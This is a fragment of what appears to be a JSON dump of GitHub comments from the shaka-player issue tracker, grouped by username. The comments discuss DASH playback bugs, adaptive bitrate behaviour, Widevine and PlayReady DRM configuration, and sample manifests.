shaka.player.Player(video);\n\n  // Attach the player to the window so that it can be easily debugged.\n  window.player = player;\n\n  // Listen for errors from the Player.\n  player.addEventListener('error', function(event) {\n    console.error(event);\n  });\n\n  // Construct a DashVideoSource to represent the DASH manifest.\n  var mpdUrl = 'https://turtle-tube.appspot.com/t/t2/dash.mpd';\n  var estimator = new shaka.util.EWMABandwidthEstimator();\n  var source = new shaka.player.DashVideoSource(mpdUrl, null, estimator);\n\n  // Load the source into the Player.\n  player.load(source);\n}\ndocument.addEventListener('DOMContentLoaded', initPlayer);\n</code></pre>\n<p>\n\n```\nI was expecting that i can see content, but in the network console there is the following error:\nUncaught TypeError: Cannot read property 'Player' of undefined\n    at HTMLDocument.initPlayer \nrelated to  var player = new shaka.player.Player(video);. Thanks, but in that tutorial i don't see example in the context of DRM. Perfect. Really thank you!. @joeyparrish  Yes, i've created shaka-enabled content using shaka packager and now i want to study a dash-enabled CDN performance, like i.e. each segment's latency. I've used this library. So do you confirm me that segment duration is 4 second? Thanks a lot!. Sorry, i have another question: what is default sampling rate when i create segments?. Ok, thanks @joeyparrish . Last (i hope, but i don't know if this is true :)  my master thesis is so long...) question: does shaka support a way to see average delay/delay jitter? . I mean segment delay: time to download each segment.. Maybe CDM schemeIdUri can uniquely identify PlayReady or Widevine?. ",
    "wader": "Related to #317\n. I signed it!\nOn Fri, Apr 1, 2016 at 5:01 PM, googlebot notifications@github.com wrote:\n\nThanks for your pull request. It looks like this may be your first\ncontribution to a Google open source project. Before we can look at your\npull request, you'll need to sign a Contributor License Agreement (CLA).\nPlease visit https://cla.developers.google.com/ to sign.\nOnce you've signed, please reply here (e.g. I signed it!) and we'll verify.\nThanks.\n\nIf you've already signed a CLA, it's possible we don't have your GitHub\nusername or you're using a different email address. Check your existing CLA\ndata and verify that your email is set on your git commits.\nIf you signed the CLA as a corporation, please let us know the company's\nname.\n\u2014\nYou are receiving this because you authored the thread.\nReply to this email directly or view it on GitHub\n. @joeyparrish CLA signed and test added. But the test is kind of useless as currently unit tests only run on uncompiled source... i tried to run it on compiled source but then a lot of other unrelated tests fails :disappointed: \n. @joeyparrish Ok, spec file change is gone now\n. @joeyparrish would it be possible to get a new 1.6.x package version to npm?\n. Im looking at the 2.0 code to see how we could access the response. My guess is that in lib/net/http_plugin.js the xhr instance needs to be assign to the error somehow or?\n. @joeyparrish Great!\nBoth body and status code would be nice\n. @joeyparrish Thanks! and now i see that status code was already there, nice\n. Hi, I got a similar issue to this (or #649) but at playback start. A bit randomly (more often for DRM content) shaka downloads some fragments and then gets stuck.\n\nWhat seems to happen is that in shaka.media.Playhead.prototype.onWatchdogTimer_ the call shaka.media.TimeRangesUtils.bufferedAheadOf(\n      this.video_.buffered, this.video_.currentTime); always returns 0. This is because currentTime is stuck at the same value and in bufferedAheadOf that value is less then the buffered time range start.\nIn onWatchdogTimer_:\n```\n\nthis.video_.readyState\n4\nthis.video_.currentTime\n0.025315\nthis.video_.paused\nfalse\n```\n\nIn bufferedAheadOf:\n```\n\nb.length\n1\nb.start(0)\n0.08\nb.end(0)\n12.08\ntime\n0.025315\n```\n\nWorks fine if I reverting https://github.com/google/shaka-player/commit/fb8174d8336fadfe7cbab66ef493da19232b27aa where currentTime is not involved in figuring out buffered time.\nThis is with CEF 3.2785.1486 which I think is  Chromium 53.\nCould it be related to https://bugs.chromium.org/p/chromium/issues/detail?id=675556 that is mentioned in #649?\nAny help would be really appreciated!\n. @joeyparrish any ideas?. @joeyparrish Ok will try. Hopefully I can reproduce it with the CEF test app. It's a bit tricky to update CEF for the application i'm working on (API change etc).\nDo you remember the reason for changing to shaka.media.TimeRangesUtils.bufferedAheadOf? should bufferedAheadOf be changed to allow to jump a small gap in the beginning if time argument is before first buffer time rage? but i'm not sure I follow why currentTime is not 0 in our case hmm. Sorry for rambling \ud83d\ude04 . ",
    "Sean-X": "I am using the latest code which is 1.9.9-alpha-debug.\nHere is the content link\nhttps://drive.google.com/file/d/0B8fe5Y9nDoZwU0pUSUxWSV95SEk/view?usp=sharing\n. Sorry, my dash packager is customized so latest changes isn't included. \nI've verified that this issue is fixed by commit ef81be5f7b5c24fdda779cee272bb45777b7800e\nThanks for all your help.\n. ",
    "aletorrado": "Not anymore. I've fixed this adding -async 1 -vsync 1 to the ffmpeg command. It seems like a browser issue anyways.\n. I cannot find where to enable verbose mode. Can you help me?\nExamples on the debugging tutorial seems outdated:\nshaka.log.setLevel(shaka.log.Level.DEBUG);\nThanks\n. I cannot find where to enable verbose mode. Can you help me?\nExamples on the debugging tutorial seems outdated:\nshaka.log.setLevel(shaka.log.Level.DEBUG);\nThanks\n. Let me test it. I'll come back here soon with that info.\n. Let me test it. I'll come back here soon with that info.\n. It isn't working at all for me right now (even without using SegmentTimeline, as the example below). Using dash.js everything is OK. When I stop the broadcast, and switch the manifest from type=dynamic to type=static, shaka is able to play it.\nBtw. all test were done streaming from localhost, to ensure no timing issues\nThis work:\n```\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n```\nThis doesn't:\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<MPD xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n    xmlns=\"urn:mpeg:dash:schema:mpd:2011\"\n    xmlns:xlink=\"http://www.w3.org/1999/xlink\"\n    xsi:schemaLocation=\"urn:mpeg:DASH:schema:MPD:2011 http://standards.iso.org/ittf/PubliclyAvailableStandards/MPEG-DASH_schema_files/DASH-MPD.xsd\"\n    profiles=\"urn:mpeg:dash:profile:isoff-live:2011\"\n    type=\"dynamic\"\n    minimumUpdatePeriod=\"PT500S\"\n    suggestedPresentationDelay=\"PT5S\"\n    availabilityStartTime=\"2016-04-28T22:40:45\"\n    publishTime=\"2016-04-28T22:42:29\"\n    minBufferTime=\"PT5.0S\">\n    <ProgramInformation>\n    </ProgramInformation>\n    <Period start=\"PT0.0S\">\n        <AdaptationSet contentType=\"video\" segmentAlignment=\"true\" bitstreamSwitching=\"true\" frameRate=\"30/1\">\n            <Representation id=\"0\" mimeType=\"video/mp4\" codecs=\"avc1.64001e\" bandwidth=\"300000\" width=\"640\" height=\"360\" frameRate=\"30/1\">\n                <SegmentTemplate timescale=\"1000000\" duration=\"5000000\" initialization=\"init-stream$RepresentationID$.m4s\" media=\"chunk-stream$RepresentationID$-$Number%05d$.m4s\" startNumber=\"1\">\n                </SegmentTemplate>\n            </Representation>\n        </AdaptationSet>\n        <AdaptationSet contentType=\"audio\" segmentAlignment=\"true\" bitstreamSwitching=\"true\">\n            <Representation id=\"1\" mimeType=\"audio/mp4\" codecs=\"mp4a.40.2\" bandwidth=\"96000\" audioSamplingRate=\"44100\">\n                <AudioChannelConfiguration schemeIdUri=\"urn:mpeg:dash:23003:3:audio_channel_configuration:2011\" value=\"2\" />\n                <SegmentTemplate timescale=\"1000000\" duration=\"5000000\" initialization=\"init-stream$RepresentationID$.m4s\" media=\"chunk-stream$RepresentationID$-$Number%05d$.m4s\" startNumber=\"1\">\n                </SegmentTemplate>\n            </Representation>\n        </AdaptationSet>\n    </Period>\n</MPD>\nHope this helps.\n. It isn't working at all for me right now (even without using SegmentTimeline, as the example below). Using dash.js everything is OK. When I stop the broadcast, and switch the manifest from type=dynamic to type=static, shaka is able to play it.\nBtw. all test were done streaming from localhost, to ensure no timing issues\nThis work:\n```\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n```\nThis doesn't:\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<MPD xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n    xmlns=\"urn:mpeg:dash:schema:mpd:2011\"\n    xmlns:xlink=\"http://www.w3.org/1999/xlink\"\n    xsi:schemaLocation=\"urn:mpeg:DASH:schema:MPD:2011 http://standards.iso.org/ittf/PubliclyAvailableStandards/MPEG-DASH_schema_files/DASH-MPD.xsd\"\n    profiles=\"urn:mpeg:dash:profile:isoff-live:2011\"\n    type=\"dynamic\"\n    minimumUpdatePeriod=\"PT500S\"\n    suggestedPresentationDelay=\"PT5S\"\n    availabilityStartTime=\"2016-04-28T22:40:45\"\n    publishTime=\"2016-04-28T22:42:29\"\n    minBufferTime=\"PT5.0S\">\n    <ProgramInformation>\n    </ProgramInformation>\n    <Period start=\"PT0.0S\">\n        <AdaptationSet contentType=\"video\" segmentAlignment=\"true\" bitstreamSwitching=\"true\" frameRate=\"30/1\">\n            <Representation id=\"0\" mimeType=\"video/mp4\" codecs=\"avc1.64001e\" bandwidth=\"300000\" width=\"640\" height=\"360\" frameRate=\"30/1\">\n                <SegmentTemplate timescale=\"1000000\" duration=\"5000000\" initialization=\"init-stream$RepresentationID$.m4s\" media=\"chunk-stream$RepresentationID$-$Number%05d$.m4s\" startNumber=\"1\">\n                </SegmentTemplate>\n            </Representation>\n        </AdaptationSet>\n        <AdaptationSet contentType=\"audio\" segmentAlignment=\"true\" bitstreamSwitching=\"true\">\n            <Representation id=\"1\" mimeType=\"audio/mp4\" codecs=\"mp4a.40.2\" bandwidth=\"96000\" audioSamplingRate=\"44100\">\n                <AudioChannelConfiguration schemeIdUri=\"urn:mpeg:dash:23003:3:audio_channel_configuration:2011\" value=\"2\" />\n                <SegmentTemplate timescale=\"1000000\" duration=\"5000000\" initialization=\"init-stream$RepresentationID$.m4s\" media=\"chunk-stream$RepresentationID$-$Number%05d$.m4s\" startNumber=\"1\">\n                </SegmentTemplate>\n            </Representation>\n        </AdaptationSet>\n    </Period>\n</MPD>\nHope this helps.\n. This commit broke it all: 1108700f105aff9c2c5e01a351dffc473b685cf7\n. This commit broke it all: 1108700f105aff9c2c5e01a351dffc473b685cf7\n. It's basically OK but the correct code is:\njs\nplayer.configure({\n  abr: { manager: new shaka.abr.SimpleAbrManager() }\n});\nThank you.\n. .seekRange doesn't work for me. I need the time of the current playback position. Btw, seekRange does not seem to be documented.\nI could use the current seek value (for example, getting the HTML Video DOM element, and getting .currentTime), but I don't know how to access MPD@availabilityStartTime using Shaka either.\n. Nope, I need the real time (UTC) of the playhead, like MPD.availabilityStartTime+video.currentTime. But I have no access to the MPD.\n. It may work but it won't be precise. I'm thinking about accesing .manifest_ to get the availabilityStartTime, but it would be really nice to have .timeAsUTC() as dash.js have. Why don't you export the manifest?\n. This works great:\nvar playHeadDate = new Date(player.manifest_.presentationTimeline.presentationStartTime_*1000 + videoElm.currentTime*1000)\n. Ok I got it. It's happening because on every player.load call, I'm doing this:\nplayer.configure({\n    abr: { manager: new shaka.abr.SimpleAbrManager() }\n});\nNow I'm doing abr.stop() on the previous abr instance to avoid this problem.\n. I cannot publish it yet, but I've just verified that error===undefined. It's strange.\n. ",
    "akopper": "Thank you a lot for your detailed analysis. I will forward this information to the instance responsible for the mpd creation. This helped me a lot.\n. ",
    "mctep": "There are error thrown after fetch next video segment:\n```\nDOMException: Failed to execute 'appendBuffer' on 'SourceBuffer': The SourceBuffer is full, and cannot free space to append additional buffers.\n    at Error (native)\n    at shaka.media.SourceBufferManager.append_ (http://localhost:8080/lib/media/source_buffer_manager.js:538:24)\n    at . (http://localhost:8080/lib/media/source_buffer_manager.js:306:22)\n    at shaka.util.Task.startNextStage_ (http://localhost:8080/lib/util/task.js:146:31)\n    at . (http://localhost:8080/lib/util/task.js:176:16)\n```\n. Thank you! Yes, it helps. I understand the problem. I'll not use large buffer size.\nAlso I have another question.\nWhen I tried to figure out the problem, I found a special behaviour of sourceBuffer. It have start buffer position at 0 initially. Some time later the start position begin increase for clearing buffer. Is it behaviour standard API of Media Source Extension or it makes shaka player? I did not find any code in shaka that remove the start of sourceBuffer with default playback.\n. Thank you for your detailed answers! It helps me.\n. ",
    "BucherTomas": "Additional info:\n- error 5000 replicable during fast seeking with all available browsers in Win 8.1, namely Chrome 49, Firefox 45, Opera 36 and IE 11.\n- Shaka 1.6.5 is stable in this regard\n. Yes, now it appears to be okay, thanks a lot. There is one new cosmetic issue in the console logs related to this.\nIf you very quickly seek a couple of times\nChrome reports: undefined:1 Uncaught (in promise) DOMException: The play() request was interrupted by a call to pause().\nFirefox reports: expected performingUpdate to be true on line 479 in /lib/media/streaming_engine.js\nPlayback is not affected, though.\n. Since IE, Firefox and Opera do not report the DOM exception, I concluded that it must be something influenced by the browser itself. This seems to support it https://bugs.chromium.org/p/chromium/issues/detail?id=593273 It's caused by recent updates, so if you have an older version of Chrome, you wouldn't be able to reproduce it.\nThat \"expected performingUpdate to be true\" message seems to be caused by high bitrate content. Our own 4k and default Sintel 4k sample cause this during fast seeking and it is reproducible in all browsers.\n. Actually, after some further testing, this appears to be caused by bandwidth estimation.\nIf I have ample bandwith available and the chunks are delivered very quickly, the bitrate adaption event is not even triggered and the playback is stuck on the first video track with the lowest quality. However, if I saturate my download speed to the max with some bandwidth-hungry connection like downloading a big file, bitrate adaptation suddenly starts working.\nThat is also possibly why the bitrate adaptation works for me with default content from Shaka demo as the delivery is a bit slower due to geographical distance to my location, but the connection between our local Wowza server and me is fast and this leads to some likely faulty bandwidth estimation. This also means that my manifest example will not likely exhibit the same behavior, say, in the US, and it might not be reproducible there.\nStill, this needs to be influenced by a recent commit, as older Shaka versions behave properly in this regard.\n. Yes, that was exactly it. After I reverted the commit, bitrate adaptation started to work from our server as usual. Good call, Joey.\n. I now tested on Chrome with nightly with adaptation disabled first and both Sintel 4k (multicodec) and Tears of Steel. Strangely enough, Sintel 4k starts for me in 426x182 (not the lowest resolution). Tears of Steel starts properly in lowest 220x124 resolution. In both cases I've been waiting for 5-7 minutes after enabling adaptation again, but it didn't switch to any higher resolution.\nIt took about 50-100 ms to get larger video segments for Tears of Steel, while it took about 200 ms to get video segments for Sintel 4k. Difference caused likely due to me being in Europe. When I started throttling my current speed 100 Mbps to 20 Mbps and less, so it took the video segments about 500 ms and more to arrive, adaptation started to work after a while. No exact measurement, but subjectively it felt like the more I throttled the bandwith, the faster it switched to next available resolution from the initial resolution I started with.\nHow long does it take on average in your case to get the video segments? There is likely a connection.\n. These last tests were done with the nightly version as you suggested. \nOur player behaving the same way is built from Shaka master from two \ndays ago.\nOn 1.7.2016 18:21, Joey Parrish wrote:\n\nInteresting. What Shaka version are you using?\n\u2014\nYou are receiving this because you authored the thread.\nReply to this email directly, view it on GitHub \nhttps://github.com/google/shaka-player/issues/435#issuecomment-229988837, \nor mute the thread \nhttps://github.com/notifications/unsubscribe/ARlzQScghvikEYPbGyzrIvgudJ13hdRrks5qRT6JgaJpZM4JDJSH.\n. None of the value updates in ewma_bandwidth_estimator.js made any relevant change, unfortunately. When debugging with Chrome dev tools, I could see my custom values being used, but it didn't help. Still stuck on the first selected resolution.\n\nI did find something worth reporting, though, when testing with Tears of Steel from Unified Streaming with adaptation disabled first.\nPlacing a breakpoint on line 310 in simple_abr_manager.js while video was already running and enabling adaptation shortly after proved by reading value of currentBandwidth that the bandwidth estimation works as it was providing good enough value for the highest quality to be enabled. Value of \"chosen\" variable on line 311 was still at the lowest bitrate, though. Also when running shakaDemo.player_.getTracks() in browser console, it reported that the lowest bitrate is currently active. So far it was consistent.\nHowever, reading value of streamsByType_['video'] on line 206 for variable oldVideo during the same debugging session provided video object with bitrate of the highest quality.\nCould it be that abr manager thinks that the highest quality is already enabled and therefore does not trigger any bitrate switching?\nNot sure where bandwidth throttling comes into play and why it helps.\n. Tested again with Tears of Steel on nightly with 6daa7f3 commit included.\n1. Starting with Adaptation disabled, value of \"Chosen\" (due to the update now on line 330) reads 405000 bits/s - the lowest bitrate. Breakpoint is still enabled.\n2. I left it running for 20 seconds, so that the bandwidth estimator had enough time to gather information and then enabled adaptation. Breakpoint is reached again and \"Chosen\" now reads already the highest bitrate 2997000 bits/s.\n3. Based on shaka.abr.SimpleAbrManager.SWITCH_INTERVAL_MS, each 8 seconds the breakpoint was reached again and the value was still the highest bitrate. I quickly pressed F8 to continue, and did so continually until playhead was at 3 minutes. Video was still playing at the lowest bitrate in the player up to this point, no bitrate switching took place as opposed to a stream with adaptation enabled from the start where switching to the chosen bitrate occurs within a couple of seconds.\nIf I repeat the same procedure with adaptation disabled first and bandwidth throttled by using \"Good 3G\" preset in Chrome dev tools, chosen bitrate in the second step is 814000 - second lowest bitrate and the player switches to it at the 1 min 20 seconds mark. Return to ABR mode works reasonably well in this low bandwidth scenario.\nThe new feature of clearing the buffer does not tackle the issue I am experiencing, but thank you for it nonetheless. I would have suggested it in the future likely anyway, we were using in our player bufferingGoal of 10 seconds instead of default 30 to shorten the switch time between chosen and displayed track and this should make it redundant.\n. Yes, from what I can see, I also believe that this is now fixed. Thank you.\n. Yes, I can confirm that the transition when adapting is now smooth on Edge and IE11. Thanks.\nI have no means to verify Safari at this moment, though.\n. I understand the reasoning behind this. I am also aware that captioning is becoming mandatory in some countries. Nevertheless, I would point out that usability of accompanying text always boils down to the project the text is used in.\nWhile I agree with you about situations where the text transcripts audio track for deaf or hearing-impaired people, you can also use subtitles for example for descriptive texts similar to text overlays in Youtube player. Their purpose could be just to describe an object on screen in a how-to video without audio commentary, especially thanks to the screen positioning capability of webvtt format. Their presence here is not necessary, they could just provide additional detail which, if missing, wouldn't have fatal consequences for understanding the video. Playback without subtitles is definitely preferred in this scenario over not starting at all.\nDevelopers in similar (granted, less than common) projects now would need to check for the external text file availability first, and if unreachable, omit it from data being fed to Shaka.\n. The subtitle files are delivered from other servers than the actual video content in our own environment. This means that for whatever reason, be it server failure, connectivity problems, etc., the subtitles could become unavailable despite video content still being usable.\nWhile the chance of this occurring is very small, it is still realistic enough that we would prefer the video content to remain playable should this happen.\n. Yes, that would of course work. We would enable this option in our player as default.\n. Thank you for listening!\n. This commit is now perfect for our scenario with single subtitles, thank you for that.\nYou might take a look at scenario with multiple subtitles, where an attempt to switch from an unavailable text file to one that is available now ends up throwing exception\n\"Assertion failed: switch: expected mediaState to exist\" in streaming_engine.js, line 417.\n Playback continues uninterrupted, so that is good, but chosen subtitles do not load.\nTo repro (tested with master at commit 40f8817):\n1. Play Tears of Steel (external text) asset from Azure Media Services group and prevent downloading English subtitles.\n2. Switch to French subtitles, or alternatively set Preferred text language as 'fr' before loading the stream.\n. @ismena thank you, now it is functional from viewer's point of view, although the previously mentioned exception still occurs in browser console when switching from unavailable to available subtitles.\n. Yes, this was the message. I wrote the exact wording in one of my earlier messages in this thread and just referred to it in my last post.\nMy reasoning for getting rid of the message was that if somebody audits the page the player is on from technical standpoint, these kinds of messages do not look favorable to the owner of the site.\nEverything is perfect now, the message is gone. Thanks again.\n. I also agree that player config should serve as an overriding mechanism. In descending order of precedence player config -> manifest -> init segment.\nOn the other hand, I do believe that the player could provide the option to parse the license server URL from the manifest. \nWe already expressed our interest earlier https://groups.google.com/forum/#!topic/shaka-player-users/YGLcAxXfMf4 ,however, that was regarding different approach of embedding license URL into the manifest by using another extension mspr:pro and license URL stored in binary data as part of PlayReady PSSH according to this specification http://download.microsoft.com/download/7/7/6/7762455C-D254-4C84-BE17-16B0C60E31FD/MPEG%20DASH%20PlayReady%201.2%20-%202014-10-08.pdf.\nThis is utilized for instance by Wowza Streaming Engine and one of Shaka's own testing assets is based on that, too - Azure Media Services/Big Buck Bunny. It is currently unnecessarily hidden from the asset list although it is working fine at this time.\nThis is not an intention to hijack the thread that concerns ms:laurl. It just points out that there is another method of license URL provisioning, although more complex, that some big names in industry are using and Shaka could make it viable for integrators to support both when giving the option to parse the manifest for license server URL.. I was curious and checked the issue as well. I would hazard a guess that the problematic 180p representation is simply not keyframe-aligned with the rest of the representations in the manifest. In case all the streams are all keyframe-aligned, Wowza must segment them in chunks with the same duration, but this is not the case here.\nIf you check the generated mpd manifests by calling\nhttp://217.172.83.187/video/definst/video/2014/AS339_A_vitjan_i_Dali_31101989.mp4/manifest.mpd and http://217.172.83.187/video/definst/video/2014/AS339_A_vitjan_i_Dali_31101989.high.mp4/manifest.mpd , respectively, 360p and 576p segment lists start both like this:\n<SegmentTimeline>\n                <S t=\"0\" d=\"1080000\"/>\n                <S d=\"810000\" r=\"1\"/>\n                <S d=\"1080000\"/>\n                <S d=\"810000\" r=\"1\"/>\nbut 180p segment list http://217.172.83.187/video/definst/video/2014/AS339_A_vitjan_i_Dali_31101989.low.mp4/manifest.mpd starts like this:\n<SegmentTimeline>\n                <S t=\"0\" d=\"1012500\"/>\n                <S d=\"1012500\"/>\n                <S d=\"675000\"/>\n                <S d=\"1012500\" r=\"1\"/>\nSegment durations are different, and for all intents and purposes, the failing segment of 180p representation as referenced in the multi-bitrate smil stream does not exist when called with cs1080000 chunk identifier. It would need to be cs1012500 for Wowza to respond properly as can be seen in the single-bitrate 180p stream.\nMake sure that the content is properly encoded by placing keyframes at regular and identical intervals for all the qualities and the multi-bitrate stream then should work fine in any DASH player.\n. You are using Shaka packager to create a manifest type suitable for live streams only (check the presence of type=\"dynamic\" in your manifest), but your source is static content.\nIf you wish to continue using live profile for your manifest, you need to append --generate_static_mpd to the command line for Shaka packager, so that it generates appropriate static manifest for your mp4 files with type=\"static\" and mediaPresentationDuration that player can then use for showing correct media duration. This should also make your media seekable.. One of you in the Shaka team can replace the URL with the one above and commit it in two minutes flat :) .\nNo need to add myself with that one line to the contributors which, from what I gathered, is a mandatory step for PR.. @boredom2  You actually can load an http stream with the https demo app. You just need to temporarily disable the mixed content error in browser.\nThis used to work fine in Chrome and Shaka just by enabling unsafe scripts in the new shield icon that pops up in the address bar once you attempt to load an http stream, but it no longer works with Shaka version 2.3.0 and newer. Something to be looked at by Shaka team?\nInterestingly enough, it still does work even with new Shaka versions and Firefox. Just attempt to load your stream, click then on the green padlock icon in address bar, click on \"show connection details\" arrow and finally click on \"Disable protection for now\" button.. As of the time of writing, segments are returning 504 in the example stream, but the manifest still works and it is returning cache-control http header set to max-age=600, which means that it can be actually cached up to 10 minutes twice along the way,\n\nLevel3 CDN used for delivery honoring the header provided by origin (or configured for this Level3 service explicitly) is caching the manifest on their nodes which is proved by their Age http headers.\nBrowser also honoring the header is caching it locally.\n\nPlayer is then provided with stale manifest for 10 minutes. The cache-control header of the manifest for live streams needs to be set to less than what minimumUpdatePeriod in the mpd states so that it can be properly refreshed both on CDN and in the browser.\nNot sure, though, how it could have worked in Bitmovin and Dash-IF, maybe the caching was configured differently at that time? Also, the live stream is generated by Wowza Streaming Engine which does not support true DVR for MPEG-DASH streams yet, so it should not be a factor in your issue.. Based on what I saw, I'd first focus on getting the cache-control header right for the mpd manifest.\nSet the value to 1 second or ask the administrators of the server to do it, if you don't have access. Wowza has mpegdashCacheControlPlaylist property for it in the application.xml when in http origin mode, however, I also noticed that copied server user agent returned from CDN is in fact nginx so there might be some cache or proxy nginx between Wowza and the CDN. In that case check and update the value there if needed.\nIf you find that the origin server is set up correctly, then it might be also caused by some default setting of the CDN itself, in that case you would need to request the change with them.\nOnce that is done, the manifest will be properly refreshed for the player every time it tries to reload it and then you can have a look at the stream again.. If it works for you in IE11 on Win 10 and doesn't on Win 8.1, one thing that comes to mind is the type of provided PlayReady license.\nIf the license is non-persistent and at the same time specifies expiration by pre-defined date or first play expiration, the PlayReady module in Win 8.1 is unable to process it. With expiration set, the license needs to be persistent for Win 8.1.\nIs this possibly your scenario?. Just want to add that although it might seem a cosmetic issue, it negatively affects user experience in our own custom app as well, so some focus on this issue would be very much appreciated.\nWe do not wish to go back to an earlier version of Shaka. . Thank you. Haven't tested our own app yet, but there is still one nit to pick, at least based on Shaka demo app.\n1. Load https://nightly-dot-shaka-player-demo.appspot.com/demo/#asset=https://ams-samplescdn.streaming.mediaservices.windows.net/11196e3d-2f40-4835-9a4d-fc52751b0323/TearsOfSteel_WAMEH264SmoothStreaming720p.ism/manifest(format=mpd-time-csf);lang=cs-CZ;build=uncompiled and enable text track with CC button. Subtitles are correctly visible.\n2. Click on Load button again without refreshing the page, text track is pre-enabled according to the player UI, however, the subtitles are not visible and need to be re-enabled again by toggling the CC button.. @sasank4git  The exception complains about audio decoder initialization failed. The audio in your content has sampling frequency of 96000 Hz. I would say that this is the reason for the issues you are experiencing.\nResample the audio to more common 48000 or 44100 Hz and try again with Opera. Chrome likely has some internal resampling involved that takes care of this.. Support for persistent licenses on Edge is tied to resolving this first https://github.com/google/shaka-player/issues/1495.\nEssentially, it is now up to Microsoft to provide proper documentation about how to utilize this new key system.. Just FYI @waxidiotic\nAs @mborecki outlined , two POST requests to Widevine license proxy (plus two OPTIONS depending on the circumstances) can be common nowadays.\nSince Widevine has introduced so-called Verified Media Path into its CDM module, user agent generates first a certificate request and only then actual license request. If your first POST request is just two bytes, then this is the request for certificate.\nShaka supports setting serverCertificate in its DRM config to use locally stored server certificate in order to avoid such certificate request.. ",
    "patrickkunka": "Could anyone shed some light on what error 5000 is? We've been seing it come in quite a bit in our error reporting recently (widevine encrypted videos), but it doesn't seem to be documented in the JSDoc errors class page.\n. OK - thanks a lot for the information, we'll upgrade ASAP.\n. Thanks so much for that snippet @mnylen - Have been struggling to find a solution to this exact same issue.\n. Thanks! I've signed the CLA.. Excellent, thanks for the fantastic library by the way, I've been using for years across various projects/companies without issue and found the documentation top notch. Unfortunately this was the first time I've been forced to use it in a pre-packaged context like this.. ",
    "hoimingw": "@joeyparrish , sorry for my late response. I was testing the issue with self-hosting Shaka player v1.6.5.\n. @tdrews , Thanks for your information, we will test it on v2.\n. The issue is blocked by https://github.com/google/shaka-player/issues/348, the fix should have been committed to master but not officially released yet. We will test with the master branch though. \nThanks,\n. Test with Shaka player 2.0.0-beta2 (2016-05-04), the problem still exist. (The first second of video is missing).\n. Hi joeyparrish,\nI don't want to post our test content to public, may I have your email address so that I can share the content with you?\nThanks,\n. Hi Joey,\nThe link to the test asset has been sent to you and Timothy.\nThanks,\n. ",
    "ZohaibGhafoor": "here is one of my mpd files:\nhttps://bsbestsongs.global.ssl.fastly.net/video-data/bollywood/D/Dear-Dad-2016/Dear-Dad-Official-Trailer.mp4/207683_98ecf3e1bda96cb3726ad62d067b5f35/207683.mpd\n. ",
    "kentuckyfriedtakahe": "Sorry - I should've been more specific. Sintel 4k (multicodec, widevine) doesn't work when media.webm.enable=true and media.mediasource.webm.enable=true because it tries to play Widevine WebM which is not supported.\n. ",
    "coder477": "Will the persistent license  or storing license service be availed on chrome desktop ? \nI tried using \"persistentstaterequired\" parameter in DRM config, in the basic tutorial available from documentation . below is what I have included in player.configure option :\njs\nplayer.configure({\n      drm: {\n        servers: {\n          'com.widevine.alpha': 'url',\n        },\n        advanced: {\n            'com.widevine.alpha': {\n              'persistentStateRequired':true\n            }\n          }  \n      }\n    });\nEven without persistentStateRequired, Having advanced in the drm config is giving exception(error 6001). Is it because it is not handled in the current player's version.\n. I am on ubuntu (chrome)..and yes it is widevine protected.\ndoesnt support persistent licenses means..not supported by widevine or not supported by shaka player? \n. I was able to play widevine encrypted videos with normal drm configuration on player.configure. as i said earlier, when trying to use advanced options, the video is not being played.\n. Following is the part of code I tried. No error on Windows but giving error on Linux on chrome browser in both cases.\nfunction initPlayer() {\nvar video = document.getElementById('video');\n    var player = new shaka.Player(video);\n    window.player = player;\n    alert(\"trueee\");\n    player.configure({\n        drm: {\n            servers: {\n                'com.widevine.alpha': 'license server url',\n            },\n            advanced: {\n                'com.widevine.alpha': {\n                    'persistentStateRequired':true\n                }\n            }\n        }\n    });\n    player.load(manifestUri).then(function() {\n    })\n}\ndocument.addEventListener('DOMContentLoaded', initApp);\n. Following is the part of code I tried. No error on Windows but giving error on Linux on chrome browser in both cases.\nfunction initPlayer() {\nvar video = document.getElementById('video');\n    var player = new shaka.Player(video);\n    window.player = player;\n    alert(\"trueee\");\n    player.configure({\n        drm: {\n            servers: {\n                'com.widevine.alpha': 'license server url',\n            },\n            advanced: {\n                'com.widevine.alpha': {\n                    'persistentStateRequired':true\n                }\n            }\n        }\n    });\n    player.load(manifestUri).then(function() {\n    })\n}\ndocument.addEventListener('DOMContentLoaded', initApp);\n. Let me try it and before that what do you conclude on persistent license on chrome desktop? Can we expect it in near time?\n. Hello the above code is working on Linux (ubuntu) as well.However If I can't get a persistent license on chrome Desktop, I doesn\u2019t need persistent parameter there. Thanks\n. ",
    "soualid": "Sorry but after reading this thread, I am not sure to understand : does the offline support for Widevine is actually implemented on Chrome Desktop ? Is it implemented in Shaka Player version 1.6 ? Is it for Shaka Player version 2.0 ?\nMany thanks in advance for clarifying this.\n. Many thanks. If I understand well and for now, no DRM vendor support persistent license for offline usage on desktop through EME.\nAnd this has, of course, nothing to do with Shaka player. Thank you again for clarifying this.\n. Thanks !\n. Good to hear, must be a problem with my device... which is a Sony Xperia XA (F3111) running latest chrome under Android 6.0, all the versions listed failed to play the widevine protected streams (clear streams are played without issue). \nOn my old HTC One running latest chrome under Android 4.2.2, the widevine items are disabled, but this one is a little outdated.\nI'll try with another device as soon as I return to work. \nThank you !\n. This is really weird, I have the exact same behaviour on a brand new Wiko Ufeel (model U FEEL) under Android 6.0 and latest chrome. \nChecked with 2 different connections (Wi-Fi and cellular), and with all the versions linked, the same widevine streams works well on the desktop. Nothing special in the logs, I recorded a screencast of the device remote debug available here : http://www.oualid.net/temp/shaka-issue.mov\nNote that I was not able to test the nightly build because the widevine streams appears unavailable  (menu disabled) using this version of shaka player.\nHere are some warnings found in the console :\nIt is recommended that a robustness level be specified. Not specifying the robustness level could result in unexpected behavior in the future, potentially including failure to play.\nAnd :\nThe last segment should not end before the end of the Period. s\u2026a.m\u2026a.SegmentReference {position: 48, startTime: 240.24, endTime: 242.70116666666667, uris: Array[1], startByte: 12019155\u2026}\n. Nope, both are fresh factory install of official Android 6 system provided by the phones vendors (Sony and Wiko). I also tried to factory reset both of them.\nThe problem is clearly that the Widevine plugin is not enable on these phones, in fact, no plugin at all are enable since console.log(navigator.plugins); 